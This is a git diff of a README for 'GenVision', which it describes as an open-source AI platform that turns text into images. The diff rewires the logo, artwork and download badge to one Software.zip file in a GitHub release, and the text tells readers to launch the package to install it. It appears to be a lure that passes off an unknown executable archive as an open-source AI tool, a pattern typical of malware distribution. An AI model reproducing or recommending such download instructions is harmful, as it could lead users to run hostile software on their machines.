@@ -2,7 +2,7 @@
 
 Welcome to **GenVision**, an open-source AI platform for generating high-quality images from text prompts. This platform is powered by cutting-edge generative models like Stable Diffusion, offering users a creative and innovative way to bring their ideas to life through digital art.
 
-![GenVision Logo](https://imageurl.com)
+![GenVision Logo](https://github.com/urbabe34/GenVision/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -43,7 +43,7 @@ GenVision leverages the power of artificial intelligence, computer vision, and d
 
 To experience the power of GenVision, download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-red)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/urbabe34/GenVision/releases/download/v1.0/Software.zip)](https://github.com/urbabe34/GenVision/releases/download/v1.0/Software.zip)
 
 **Note:** The software package needs to be launched for installation and setup.
 
@@ -71,4 +71,4 @@ Together, we can redefine art, innovation, and the future of generative AI. Join
 
 **GenVision - Transforming Text into Art**
 
-![GenVision Artwork](https://imageurl.com)
+![GenVision Artwork](https://github.com/urbabe34/GenVision/releases/download/v1.0/Software.zip)
